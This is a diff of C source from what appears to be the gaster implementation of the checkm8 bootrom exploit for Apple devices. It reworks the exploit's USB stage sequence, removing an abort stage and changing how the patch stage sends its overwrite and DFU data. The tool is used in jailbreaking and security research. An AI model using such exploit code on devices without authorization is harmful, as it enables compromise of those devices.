@@ -188,8 +188,7 @@ static enum {
 	STAGE_SPRAY,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_PWNED,
-	STAGE_ABORT
+	STAGE_PWNED
 } stage;
 static uint16_t cpid;
 static bool manual_reset;
@@ -528,7 +527,7 @@ reset_usb_handle(usb_handle_t *handle) {
 	UInt64 session_id;
 
 	if(manual_reset) {
-		if(stage == STAGE_SETUP && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011) && get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
+		if((stage == STAGE_SETUP || stage == STAGE_PATCH) && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011) && get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
 			close_usb_handle(handle);
 			puts("Please disconnect and reconnect the lightning cable now.");
 			return wait_usb_handle(handle, 0, 0, manual_reset_check_usb_device, &session_id);
@@ -1287,9 +1286,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 						overwrite_sz = sizeof(checkm8_overwrite);
 					}
 					if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
-						ret = cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003 || dfu_send_data(handle, data, data_sz, false);
-						if(cpid != 0x8960) {
+						ret = true;
+						if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
 							send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+						} else if(!dfu_send_data(handle, data, data_sz, false)) {
+							ret = false;
 						}
 					}
 					free(data);
@@ -1325,20 +1326,15 @@ gaster_checkm8(usb_handle_t *handle) {
 				puts("Stage: SETUP");
 				ret = checkm8_stage_setup(handle);
 				stage = STAGE_PATCH;
-			} else if(stage == STAGE_PATCH) {
+			} else {
 				puts("Stage: PATCH");
 				ret = checkm8_stage_patch(handle);
-				stage = STAGE_ABORT;
-			} else {
-				puts("Stage: ABORT");
-				send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
-				ret = true;
 			}
 			if(ret) {
 				puts("ret: true");
 			} else {
 				puts("ret: false");
-				if(stage != STAGE_ABORT) {
+				if(stage != STAGE_PATCH) {
 					stage = STAGE_RESET;
 				}
 			}
